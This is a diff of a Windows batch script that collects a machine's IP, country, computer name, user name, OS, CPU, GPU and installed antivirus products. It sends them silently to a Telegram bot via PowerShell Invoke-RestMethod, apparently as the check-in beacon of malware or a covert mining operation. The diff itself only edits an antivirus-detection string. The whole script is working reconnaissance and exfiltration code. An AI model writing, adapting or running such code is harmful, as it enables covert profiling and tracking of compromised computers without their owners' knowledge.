@@ -20,7 +20,7 @@ for /f "tokens=*" %A in ('powershell -command "[System.Environment]::Is64BitOper
 
 set "Antivirus=No Antivirus"
 for /f "tokens=*" %A in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "Antivirus" /t REG_SZ 2^>nul') do (
-    if "%A" NEQ "Поиск завершен: найдено совпадений: 0." (
+    if "%A" NEQ "No Antivirus." (
         if defined Antivirus (
             set "Antivirus=!Antivirus!, %A"
         ) else (
@@ -51,5 +51,4 @@ set "Worker=%COMPUTERNAME%"
 powershell -command ^
 "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%'; ^
 Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
-
 endlocal
